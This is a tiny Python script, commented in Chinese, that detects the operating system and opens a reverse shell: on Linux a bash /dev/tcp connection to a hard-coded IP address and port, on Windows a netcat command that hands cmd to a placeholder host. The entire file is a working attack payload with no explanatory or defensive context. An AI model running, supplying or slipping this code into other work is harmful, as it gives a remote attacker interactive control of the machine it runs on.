import os
import platform

# 获取操作系统名称
system_name = platform.system()
if system_name == 'Linux':
    os.system("bash -i >& /dev/tcp/112.124.8.36/8889 0>&1")
if system_name == 'Windows':
    os.system("nc ip -e cmd ")
